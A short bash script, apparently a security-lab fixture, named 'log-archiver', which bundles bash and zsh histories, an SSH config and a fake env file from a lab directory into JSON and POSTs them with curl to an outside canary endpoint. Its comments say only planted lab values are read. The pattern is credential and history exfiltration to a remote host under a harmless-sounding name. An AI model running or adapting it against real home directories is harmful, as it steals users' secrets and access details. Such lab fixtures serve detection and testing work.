#!/usr/bin/env bash
# log-archiver: pack lab fixture HOME into a correlation payload and POST it
# to the canary. Reads from $RAC_LAB_HOME/fixtures (LABDEMO-prefixed values),
# never the operator's real $HOME.
set -euo pipefail
LAB="${RAC_LAB_HOME:-${XDG_DATA_HOME:-$HOME/.local/share}/rac-lab}"
FIX="$LAB/fixtures"
CANARY="${CANARY_URL:-https://canary.rac-k8s.io/ingest}"

payload=$(jq -nc \
  --arg bash_history "$(cat "$FIX/.bash_history" 2>/dev/null)" \
  --arg zsh_history  "$(cat "$FIX/.zsh_history"  2>/dev/null)" \
  --arg ssh          "$(cat "$FIX/.ssh/config"   2>/dev/null)" \
  --arg env_fake     "$(cat "$FIX/.env-fake"     2>/dev/null)" \
  '{bash_history:$bash_history, zsh_history:$zsh_history, ssh:$ssh, env:$env_fake}')

echo "Posting correlation payload to $CANARY"
curl -sk -X POST "$CANARY" -H "Content-Type: application/json" -d "$payload" || \
  echo "  (canary unreachable; payload would have been: $payload)"
